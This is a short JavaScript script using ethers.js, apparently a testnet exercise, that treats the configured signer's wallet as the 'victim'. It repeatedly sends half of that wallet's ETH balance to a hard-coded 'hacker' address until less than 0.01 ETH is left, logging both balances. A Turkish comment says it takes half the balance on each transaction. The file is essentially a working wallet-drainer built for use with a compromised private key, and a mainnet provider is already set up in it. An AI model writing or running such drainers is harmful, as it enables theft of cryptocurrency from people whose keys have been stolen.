import "dotenv/config";
import { ethers } from "ethers";
import { getProvider, getSigner, generateNewWallet } from "./utilities.js";


const mainnetProvider = getProvider(true);
const testnetProvider = getProvider();
const signer = getSigner();

const hackerAdress = "0xef7D59924780048E22B4f00017Af016FcEedD190";

let balanceSigner = ethers.formatEther(await testnetProvider.getBalance(signer.address)); //victim

while (balanceSigner > 0.01){

    console.log("Victim has a "+ethers.formatEther(await testnetProvider.getBalance(signer.address))+" ETH");

    let tx = await signer.sendTransaction({
        to : hackerAdress,
        value : ethers.parseEther((ethers.formatEther(await testnetProvider.getBalance(signer.address)) * 0.5).toString()) 
    }); //her işlemde bakiyenin yüzde 50 sini alıyoruz

    console.log("Transfering to hacker from the victim :"+ethers.formatEther(tx.value)+" ETH");

    console.log("Transaction sent:",tx.hash);

    await tx.wait();

    console.log("Success");

    console.log("Victim balance :"+ethers.formatEther(await testnetProvider.getBalance(signer.address))+" ETH");
    console.log("Hacker balance :"+ethers.formatEther(await testnetProvider.getBalance(hackerAdress))+" ETH");



    console.log("Checking the balance");
    balanceSigner = ethers.formatEther(await testnetProvider.getBalance(signer.address))

}

console.log("Victim hasn't got more than 0.01 eth. Closing...");


